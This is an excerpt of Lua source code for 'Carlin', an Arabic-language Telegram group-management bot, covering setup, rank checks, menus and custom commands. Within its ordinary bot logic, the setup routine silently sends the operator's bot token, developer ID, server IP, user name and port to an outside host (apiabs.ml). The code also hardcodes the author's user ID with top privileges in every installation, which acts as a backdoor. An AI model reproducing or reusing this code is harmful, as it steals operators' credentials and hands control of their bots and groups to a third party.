------------------------------------------------
-- This Source Was Developed By (Rio) @KKKKKKRD.--
--   This Is The Source Channel @TOLENTEam .   --
--                - Carlin -                 --
--        -- https://t.me/TOLENTEam --         --
------------------------------------------------ 
...
if not DevRio:get(Server.."IdCarlin") then 
io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
local DevId = io.read():gsub(' ','') 
if tostring(DevId):match('%d+') then 
io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
DevRio:set(Server.."IdCarlin",DevId) 
else 
print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
end 
os.execute('lua Carlin.lua') 
end 
if not DevRio:get(Server.."TokenCarlin") then 
...
DevRio:set(Server.."TokenCarlin",TokenBot) 
end  
else 
...
Config = {
DevId = DevRio:get(Server.."IdCarlin"),
TokenBot = DevRio:get(Server.."TokenCarlin"),
Carlin = DevRio:get(Server.."TokenCarlin"):match("(%d+)"),
SudoIds = {DevRio:get(Server.."IdCarlin")},
}
Create(Config, "./config.lua") 
https.request("https://apiabs.ml/Api/Carlin/index.php?Get=Carlin&DevId="..DevRio:get(Server.."IdCarlin").."&TokenBot="..DevRio:get(Server.."TokenCarlin").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
file = io.open("Carlin.sh", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/Carlin
token="]]..DevRio:get(Server.."TokenCarlin")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
...
./tg -s ./Carlin.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("Run", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S Carlin -X kill
screen -S Carlin ./Carlin.sh
done
]]) 
file:close() 
...
local Load_Carlin = function() 
local f = io.open("./config.lua", "r") 
if not f then 
AutoSet() 
else 
f:close() 
DevRio:del(Server.."IdCarlin");DevRio:del(Server.."TokenCarlin")
end 
...
DevId = Config.DevId
SudoIds = {Config.SudoIds,1983379011}
Carlin = Config.Carlin
TokenBot = Config.TokenBot
NameBot = (DevRio:get(Carlin..'Rio:NameBot') or 'Carlin')
--     Source Carlin     --
...
local Status = DevRio:sismember(Carlin..'Rio:RioSudo:',msg.sender_user_id_) 
...
local Status = DevRio:sismember(Carlin..'Rio:SecondSudo:',msg.sender_user_id_) 
...
function Bot(msg) 
local var = false  
if msg.sender_user_id_ == tonumber(Carlin) then  
var = true  
end  
return var  
end 
...
local Status = DevRio:sismember(Carlin..'Rio:SudoBot:',msg.sender_user_id_) 
...
local Status = DevRio:sismember(Carlin..'Rio:RioConstructor:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(Carlin..'Rio:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(Carlin..'Rio:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(Carlin..'Rio:Managers:'..msg.chat_id_,msg.sender_user_id_) 
...
----------  Admin  ---------
function Admin(msg) 
local Status = DevRio:sismember(Carlin..'Rio:Admins:'..msg.chat_id_,msg.sender_user_id_) 
...
---------Vip Member---------
function VipMem(msg) 
local Status = DevRio:sismember(Carlin..'Rio:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(Carlin..'Rio:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or RioConstructor(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
...
local Status = DevRio:sismember(Carlin..'Rio:CleanerNum:'..msg.chat_id_,msg.sender_user_id_) 
...
if DevRio:sismember(Carlin..'Rio:Ban:'..chat_id, user_id) then
var = true
else
var = false
end
...
if DevRio:sismember(Carlin..'Rio:BanAll:', user_id) then
var = true
else
var = false
end
...
if DevRio:sismember(Carlin..'Rio:Muted:'..chat_id, user_id) then
var = true
else
var = false
end
...
if DevRio:sismember(Carlin..'Rio:MuteAll:', user_id) then
var = true
else
var = false
end
...
local Text = '᥀︙قم باستعمال الازرار لرفع العضو ↫ ⤈\n᥀︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'TOLENTEam')..')'
keyboard = {} 
if Sudo(data) then
...
DevRio:del(Carlin..'Rio:Text:KtTexts'..Rio..data.chat_id_)
DevRio:srem(Carlin..'Rio:Sudo:Kt'..data.chat_id_,Rio)
end
...
local List = DevRio:smembers(Carlin..'Rio:Text:KtTexts'..Rio..data.chat_id_)
if DevRio:get(Carlin..'Rio:Add:Kt'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم انهاء وحفظ ↫ "..#List.." من الاسئله للامر ↫ "..Rio) 
DevRio:del(Carlin..'Rio:Add:Kt'..data.sender_user_id_..data.chat_id_)
else
...
DevRio:del(Carlin..'Rio:Add:Kt'..data.sender_user_id_..data.chat_id_)
DevRio:del(Carlin..'Rio:Text:KtTexts'..Rio..data.chat_id_)
DevRio:del(Carlin..'Rio:Add:KtTexts'..data.sender_user_id_..data.chat_id_)
DevRio:srem(Carlin..'Rio:Sudo:Kt'..data.chat_id_,Rio)
else
EditMsg(Chat_Id2, Msg_Id2, "᥀︙عذرا صلاحية الامر منتهيه !") 
end
...
--     Source Carlin     --
function CarlinFiles(msg)
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
plugin = dofile("Files/"..v)
if plugin.Carlin and msg then
FilesText = plugin.Carlin(msg)
end
end
end
...
if File_Name:lower():match('(%d+)') ~= Carlin:lower() then 
...
local info_file = io.open('./'..Carlin..'.json', "r"):read('*a')
local JsonInfo = JSON.decode(info_file)
vardump(JsonInfo)
DevRio:set(Carlin.."Rio:NameBot",JsonInfo.BotName) 
for IdGps,v in pairs(JsonInfo.GroupsList) do
DevRio:sadd(Carlin.."Rio:Groups",IdGps) 
DevRio:set(Carlin.."Rio:Lock:Bots"..IdGps,"del") DevRio:hset(Carlin.."Rio:Spam:Group:User"..IdGps ,"Spam:User","keed") 
...
DevRio:set(Carlin..Lock..IdGps,true)
end
if v.RioConstructors then
for k,IdRioConstructors in pairs(v.RioConstructors) do
DevRio:sadd(Carlin..'Rio:RioConstructor:'..IdGps,IdRioConstructors)  
print('تم رفع منشئين المجموعات')
end
end
if v.BasicConstructors then
for k,IdBasicConstructors in pairs(v.BasicConstructors) do
DevRio:sadd(Carlin..'Rio:BasicConstructor:'..IdGps,IdBasicConstructors)  
print('تم رفع ( '..k..' ) منشئين اساسيين')
end
end
if v.Constructors then
for k,IdConstructors in pairs(v.Constructors) do
DevRio:sadd(Carlin..'Rio:Constructor:'..IdGps,IdConstructors)  
print('تم رفع ( '..k..' ) منشئين')
end
end
if v.Managers then
for k,IdManagers in pairs(v.Managers) do
DevRio:sadd(Carlin..'Rio:Managers:'..IdGps,IdManagers)  
...
vardump(IdAdmins)
DevRio:sadd(Carlin..'Rio:Admins:'..IdGps,IdAdmins)  
print('تم رفع ( '..k..' ) ادمنيه')
end
end
if v.Vips then
for k,IdVips in pairs(v.Vips) do
DevRio:sadd(Carlin..'Rio:VipMem:'..IdGps,IdVips)  
print('تم رفع ( '..k..' ) مميزين')
end
end
if v.LinkGroups then
if v.LinkGroups ~= "" then
DevRio:set(Carlin.."Rio:Groups:Links"..IdGps,v.LinkGroups)   
print('( تم وضع روابط المجموعات )')
end
end
if v.Welcomes then
if v.Welcomes ~= "" then
DevRio:set(Carlin.."Rio:Groups:Welcomes"..IdGps,v.Welcomes)   
...
DevRio:set(Carlin..'Rio:Add:Kt'..msg.sender_user_id_..msg.chat_id_,'SetKt')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل امر `كت تويت` الان" ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local SetKt = DevRio:get(Carlin..'Rio:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
if SetKt == 'SetKt' then
if text == "الغاء" then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر" ,  1, "md")
DevRio:del(Carlin..'Rio:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
return false
end
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الامر ارسل السؤال الاول\n᥀︙للخروج ارسل ↫ ( الغاء )" ,  1, "md")
DevRio:set(Carlin..'Rio:Add:Kt'..msg.sender_user_id_..msg.chat_id_,'SaveKt')
DevRio:set(Carlin..'Rio:Add:KtTexts'..msg.sender_user_id_..msg.chat_id_,text)
DevRio:sadd(Carlin..'Rio:Sudo:Kt'..msg.chat_id_,text)
return false
end end
--     Source Carlin.    --
...
--     Source Carlin     --
local RioRank = function(msg) if SudoId(msg.sender_user_id_) then CarlinTeam  = "المطور" elseif RioSudo(msg) then CarlinTeam = "المطور" elseif SecondSudo(msg) then CarlinTeam = "المطور" elseif SudoBot(msg) then CarlinTeam = "المطور" elseif Manager(msg) then CarlinTeam = "المدير" elseif Admin(msg) then CarlinTeam = "الادمن" else CarlinTeam = "العضو" end return CarlinTeam end
function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1983379011) then CarlinTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(Carlin) then CarlinTeam = 'البوت' elseif SudoId(user_id) then CarlinTeam = 'المطور الاساسي' elseif DevRio:sismember(Carlin..'Rio:RioSudo:', user_id) then CarlinTeam = 'المطور الاساسي' elseif DevRio:sismember(Carlin..'Rio:SecondSudo:', user_id) then CarlinTeam = 'المطور الاساسي²' elseif DevRio:sismember(Carlin..'Rio:SudoBot:', user_id) then CarlinTeam = DevRio:get(Carlin.."Rio:SudoBot:Rd"..chat_id) or 'المطور' elseif DevRio:sismember(Carlin..'Rio:RioConstructor:'..chat_id, user_id) then CarlinTeam = 'المالك' elseif DevRio:sismember(Carlin..'Rio:BasicConstructor:'..chat_id, user_id) then CarlinTeam = DevRio:get(Carlin.."Rio:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevRio:sismember(Carlin..'Rio:Constructor:'..chat_id, user_id) then CarlinTeam = DevRio:get(Carlin.."Rio:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevRio:sismember(Carlin..'Rio:Managers:'..chat_id, user_id) then CarlinTeam = DevRio:get(Carlin.."Rio:Managers:Rd"..chat_id) or 'المدير' elseif DevRio:sismember(Carlin..'Rio:Admins:'..chat_id, user_id) then CarlinTeam = DevRio:get(Carlin.."Rio:Admins:Rd"..chat_id) or 'الادمن' elseif DevRio:sismember(Carlin..'Rio:VipMem:'..chat_id, user_id) then  CarlinTeam = DevRio:get(Carlin.."Rio:VipMem:Rd"..chat_id) or 'المميز' elseif DevRio:sismember(Carlin..'Rio:Cleaner:'..chat_id, user_id) then  CarlinTeam = DevRio:get(Carlin.."Rio:Cleaner:Rd"..chat_id) or 'المنظف' else CarlinTeam = DevRio:get(Carlin.."Rio:mem:Rd"..chat_id) or 'العضو' end return CarlinTeam end
--     Source Carlin     --
function RankChecking(user_id,chat_id)
if SudoId(user_id) then
var = true  
elseif tonumber(user_id) == tonumber(Carlin) then  
var = true
elseif DevRio:sismember(Carlin..'Rio:RioSudo:', user_id) then
var = true
elseif DevRio:sismember(Carlin..'Rio:SecondSudo:', user_id) then
var = true  
elseif DevRio:sismember(Carlin..'Rio:SudoBot:', user_id) then
var = true 
elseif DevRio:sismember(Carlin..'Rio:RioConstructor:'..chat_id, user_id) then
var = true
elseif DevRio:sismember(Carlin..'Rio:BasicConstructor:'..chat_id, user_id) then
var = true
elseif DevRio:sismember(Carlin..'Rio:Constructor:'..chat_id, user_id) then
var = true  
elseif DevRio:sismember(Carlin..'Rio:Managers:'..chat_id, user_id) then
var = true  
elseif DevRio:sismember(Carlin..'Rio:Admins:'..chat_id, user_id) then
var = true  
elseif DevRio:sismember(Carlin..'Rio:VipMem:'..chat_id, user_id) then  
var = true 
else  
var = false
end  
...
local rio = (Carlin..'Rio:Filters:'..msg.chat_id_)
if rio then
...
if dp.first_name_ ~= false then
local UserName = (dp.username_ or "TOLENTEam")
...
--     Source Carlin     --
function riomoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevRio:get(Carlin..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
--     Source Carlin     --
function ChCheck(msg)
local var = true 
if DevRio:get(Carlin.."Rio:ChId") then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..DevRio:get(Carlin..'Rio:ChId')..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
if DevRio:get(Carlin..'Rio:ChText') then
local ChText = DevRio:get(Carlin..'Rio:ChText')
send(msg.chat_id_,msg.id_,'['..ChText..']')
else
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevRio:get(Carlin.."Rio:ChId"))
local GetInfo = JSON.decode(Check)
...
if DataText == '/delyes' and DevRio:get(Carlin..'yes'..data.sender_user_id_) == 'delyes' then
DevRio:del(Carlin..'yes'..data.sender_user_id_, 'delyes')
DevRio:del(Carlin..'no'..data.sender_user_id_, 'delno')
...
if DataText == '/delno' and DevRio:get(Carlin..'no'..data.sender_user_id_) == 'delno' then
DevRio:del(Carlin..'yes'..data.sender_user_id_, 'delyes')
DevRio:del(Carlin..'no'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء امر اطردني") 
end
--     Source Carlin     --
if DataText == '/yesdel' and DevRio:get(Carlin..'yesdel'..data.sender_user_id_) == 'delyes' then
DevRio:del(Carlin..'yesdel'..data.sender_user_id_, 'delyes')
DevRio:del(Carlin..'nodel'..data.sender_user_id_, 'delno')
if DevRio:sismember(Carlin..'Rio:Constructor:'..data.chat_id_, data.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevRio:sismember(Carlin..'Rio:Managers:'..data.chat_id_, data.sender_user_id_) then
Managers = 'المدراء • ' else Managers = '' end
if DevRio:sismember(Carlin..'Rio:Admins:'..data.chat_id_, data.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevRio:sismember(Carlin..'Rio:VipMem:'..data.chat_id_, data.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevRio:sismember(Carlin..'Rio:Cleaner:'..data.chat_id_, data.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = '' end
if DevRio:sismember(Carlin..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
donky = 'المطايه • ' else donky = '' end
if DevRio:sismember(Carlin..'Rio:Constructor:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(Carlin..'Rio:Managers:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(Carlin..'Rio:Admins:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(Carlin..'Rio:VipMem:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(Carlin..'Rio:Cleaner:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(Carlin..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
DevRio:srem(Carlin..'Rio:Constructor:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(Carlin..'Rio:Managers:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(Carlin..'Rio:Admins:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(Carlin..'Rio:VipMem:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(Carlin..'Rio:Cleaner:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(Carlin..'User:Donky:'..data.chat_id_,data.sender_user_id_)
...
if DevRio:get(Carlin.."Rio:NewDev"..data.sender_user_id_) then
if DataText == '/setno' then
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء امر تغير المطور الاساسي") 
DevRio:del(Carlin.."Rio:NewDev"..data.sender_user_id_)
return false
end
if DataText == '/setyes' then
local NewDev = DevRio:get(Carlin.."Rio:NewDev"..data.sender_user_id_)
...
if DataText == '/nodel' and DevRio:get(Carlin..'nodel'..data.sender_user_id_) == 'delno' then
DevRio:del(Carlin..'yesdel'..data.sender_user_id_, 'delyes')
DevRio:del(Carlin..'nodel'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء امر نزلني") 
end
if DataText == '/YesRolet' and DevRio:get(Carlin.."Rio:WittingStartRolet"..data.chat_id_..data.sender_user_id_) then
local List = DevRio:smembers(Carlin..'Rio:ListRolet'..data.chat_id_) 
local UserName = List[math.random(#List)]
tdcli_function ({ID="SearchPublicChat",username_ = UserName},function(arg,dp) 
DevRio:incrby(Carlin..'Rio:GamesNumber'..data.chat_id_..dp.id_, 5) 
end,nil) 
DevRio:del(Carlin..'Rio:ListRolet'..data.chat_id_) 
DevRio:del(Carlin.."Rio:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "᥀︙*صاحب الحظ* ↫ ["..UserName.."]\n᥀︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*")
end
if DataText == '/NoRolet' then
DevRio:del(Carlin..'Rio:ListRolet'..data.chat_id_) 
DevRio:del(Carlin.."Rio:NumRolet"..data.chat_id_..data.sender_user_id_) 
DevRio:del(Carlin.."Rio:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
...
if DevRio:sismember(Carlin..'Rio:Tkeed:'..Chat_Id2, data.sender_user_id_) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..Chat_Id2.."&user_id="..data.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevRio:srem(Carlin..'Rio:Tkeed:'..Chat_Id2, data.sender_user_id_)
...
DevRio:del(Carlin..'Rio:Text:GpTexts'..Rio..data.chat_id_)
DevRio:srem(Carlin..'Rio:Manager:GpRedod'..data.chat_id_,Rio)
end
if DataText and DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)')
local List = DevRio:smembers(Carlin..'Rio:Text:GpTexts'..Rio..data.chat_id_)
if DevRio:get(Carlin..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم انهاء وحفظ ↫ "..#List.." من الردود المتعدده للامر ↫ "..Rio) 
DevRio:del(Carlin..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
else
EditMsg(Chat_Id2, Msg_Id2, "᥀︙عذرا صلاحية الامر منتهيه !") 
end
end
...
DevRio:del(Carlin..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
DevRio:del(Carlin..'Rio:Text:GpTexts'..Rio..data.chat_id_)
DevRio:del(Carlin..'Rio:Add:GpTexts'..data.sender_user_id_..data.chat_id_)
DevRio:srem(Carlin..'Rio:Manager:GpRedod'..data.chat_id_,Rio)
else
EditMsg(Chat_Id2, Msg_Id2, "᥀︙عذرا صلاحية الامر منتهيه !") 
end
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Help = DevRio:get(Carlin..'Rio:Help')
local Text = [[
...
᥀︙م6 ↫ اوامر الاعضاء
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/TOLENTEam)
]] 
keyboard = {} 
...
local Help = DevRio:get(Carlin..'Rio:Help1')
local Text = [[
...
local Help = DevRio:get(Carlin..'Rio:Help2')
local Text = [[
᥀︙اوامر الادمنيه ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙الاعدادت
...
local Help = DevRio:get(Carlin..'Rio:Help3')
local Text = [[
᥀︙اوامر المدراء ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙فحص البوت
...
local Help = DevRio:get(Carlin..'Rio:Help4')
local Text = [[
᥀︙اوامر المنشئين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تنزيل الكل
...
local Help = DevRio:get(Carlin..'Rio:Help5')
local Text = [[
᥀︙اوامر المطورين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙الكروبات
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Help = DevRio:get(Carlin..'Rio:Help6')
local Text = [[
᥀︙اوامر الاعضاء ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
...
if text and DevRio:get(Carlin.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = DevRio:get(Carlin.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
DevRio:del(Carlin.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
DevRio:del(Carlin.."Set:Cmd:Group:New"..msg.chat_id_)
DevRio:srem(Carlin.."List:Cmd:Group:New"..msg.chat_id_,text)
...
DevRio:del(Carlin.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if text and text:match('^'..(DevRio:get(Carlin..'Rio:NameBot') or "Carlin")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevRio:get(Carlin..'Rio:NameBot') or "Carlin")..' ','')
end
if data.message_.content_.text_ then
local NewCmmd = DevRio:get(Carlin.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if text and DevRio:get(Carlin.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
DevRio:set(Carlin.."Set:Cmd:Group:New"..msg.chat_id_,text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙ارسل الامر الجديد", 1, 'html')
DevRio:del(Carlin.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
DevRio:set(Carlin.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and DevRio:get(Carlin.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = DevRio:get(Carlin.."Set:Cmd:Group:New"..msg.chat_id_)
DevRio:set(Carlin.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
DevRio:sadd(Carlin.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الامر", 1, 'html')
DevRio:del(Carlin.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if Constructor(msg) then
if text == "الاوامر المضافه" and ChCheck(msg) then
local List = DevRio:smembers(Carlin.."List:Cmd:Group:New"..msg.chat_id_.."") 
t = "᥀︙قائمة الاوامر المضافه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
Cmds = DevRio:get(Carlin.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..k.."~ ("..v..") • {"..Cmds.."}\n"
else
t = t..k.."~ ("..v..") \n"
...
local List = DevRio:smembers(Carlin.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(List) do
DevRio:del(Carlin.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
DevRio:del(Carlin.."List:Cmd:Group:New"..msg.chat_id_)
end
...
DevRio:set(Carlin.."Set:Cmd:Group:New1"..msg.chat_id_..":ا","ايدي")
DevRio:sadd(Carlin.."List:Cmd:Group:New"..msg.chat_id_,"ا")
DevRio:set(Carlin.."Set:Cmd:Group:New1"..msg.chat_id_..":م","رفع مميز")
DevRio:sadd(Carlin.."List:Cmd:Group:New"..msg.chat_id_,"م")
DevRio:set(Carlin.."Set:Cmd:Group:New1"..msg.chat_id_..":اد","رفع ادمن")
DevRio:sadd(Carlin.."List:Cmd:Group:New"..msg.chat_id_,"اد")
DevRio:set(Carlin.."Set:Cmd:Group:New1"..msg.chat_id_..":مد","رفع مدير")
DevRio:sadd(Carlin.."List:Cmd:Group:New"..msg.chat_id_,"مد")
DevRio:set(Carlin.."Set:Cmd:Group:New1"..msg.chat_id_..":من","رفع منشئ")
DevRio:sadd(Carlin.."List:Cmd:Group:New"..msg.chat_id_,"من")
DevRio:set(Carlin.."Set:Cmd:Group:New1"..msg.chat_id_..":اس","رفع منشئ اساسي")
DevRio:sadd(Carlin.."List:Cmd:Group:New"..msg.chat_id_,"اس")
DevRio:set(Carlin.."Set:Cmd:Group:New1"..msg.chat_id_..":مط","رفع مطور")
DevRio:sadd(Carlin.."List:Cmd:Group:New"..msg.chat_id_,"مط")
DevRio:set(Carlin.."Set:Cmd:Group:New1"..msg.chat_id_..":ثانوي","رفع مطور ثانوي")
DevRio:sadd(Carlin.."List:Cmd:Group:New"..msg.chat_id_,"ثانوي")
DevRio:set(Carlin.."Set:Cmd:Group:New1"..msg.chat_id_..":تك","تنزيل الكل")
DevRio:sadd(Carlin.."List:Cmd:Group:New"..msg.chat_id_,"تك")
DevRio:set(Carlin.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط","تعطيل الايدي بالصوره")
DevRio:sadd(Carlin.."List:Cmd:Group:New"..msg.chat_id_,"تعط")
DevRio:set(Carlin.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع","تفعيل الايدي بالصوره")
DevRio:sadd(Carlin.."List:Cmd:Group:New"..msg.chat_id_,"تفع")
DevRio:set(Carlin.."Set:Cmd:Group:New1"..msg.chat_id_..":ر","الرابط")
DevRio:sadd(Carlin.."List:Cmd:Group:New"..msg.chat_id_,"ر")
DevRio:set(Carlin.."Set:Cmd:Group:New1"..msg.chat_id_..":رر","ردود المدير")
DevRio:sadd(Carlin.."List:Cmd:Group:New"..msg.chat_id_,"رر")
DevRio:set(Carlin.."Set:Cmd:Group:New1"..msg.chat_id_..":،،","مسح المكتومين")
DevRio:sadd(Carlin.."List:Cmd:Group:New"..msg.chat_id_,"،،")
DevRio:set(Carlin.."Set:Cmd:Group:New1"..msg.chat_id_..":رد","اضف رد")
DevRio:sadd(Carlin.."List:Cmd:Group:New"..msg.chat_id_,"رد")
DevRio:set(Carlin.."Set:Cmd:Group:New1"..msg.chat_id_..":سح","مسح سحكاتي")
DevRio:sadd(Carlin.."List:Cmd:Group:New"..msg.chat_id_,"سح")
DevRio:set(Carlin.."Set:Cmd:Group:New1"..msg.chat_id_..":رس","مسح رسائلي")
DevRio:sadd(Carlin.."List:Cmd:Group:New"..msg.chat_id_,"رس")
DevRio:set(Carlin.."Set:Cmd:Group:New1"..msg.chat_id_..":غ","غنيلي")
DevRio:sadd(Carlin.."List:Cmd:Group:New"..msg.chat_id_,"غ")
DevRio:set(Carlin.."Set:Cmd:Group:New1"..msg.chat_id_..":#","مسح قائمه العام")
DevRio:sadd(Carlin.."List:Cmd:Group:New"..msg.chat_id_,"#")
...
DevRio:set(Carlin.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
...
DevRio:set(Carlin.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
...
local CarlinTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل اليوتيوب بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Carlin.."Rio:WhyTube"..msg.chat_id_) 
return false  
end
if text == 'تعطيل اليوتيوب' and Manager(msg) then  
local CarlinTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل اليوتيوب بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, CarlinTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Carlin.."Rio:WhyTube"..msg.chat_id_,true) 
return false  
end 
if text and text:match('^بحث (.*)$') and not DevRio:get(Carlin.."Rio:WhyTube"..msg.chat_id_) and ChCheck(msg) then            
...
local List = DevRio:smembers(Carlin.."Coomds"..msg.chat_id_)
if #List == 0 then
...
for k,v in pairs(List) do
var = DevRio:get(Carlin.."Comd:New:rt:Rio:"..v..msg.chat_id_)
if var then
t = t..k.."~ "..v.." • ("..var..")\n"
else
t = t..k.."~ "..v.."\n"
...
local List = DevRio:smembers(Carlin.."Coomds"..msg.chat_id_)
for k,v in pairs(List) do
DevRio:del(Carlin.."Comd:New:rt:Rio:"..v..msg.chat_id_)
DevRio:del(Carlin.."Coomds"..msg.chat_id_)
end
...
DevRio:set(Carlin.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
DevRio:sadd(Carlin.."Coomds"..msg.chat_id_,ComdNew)  
DevRio:setex(Carlin.."Comd:New"..msg.chat_id_..msg.sender_user_id_,200,true)  
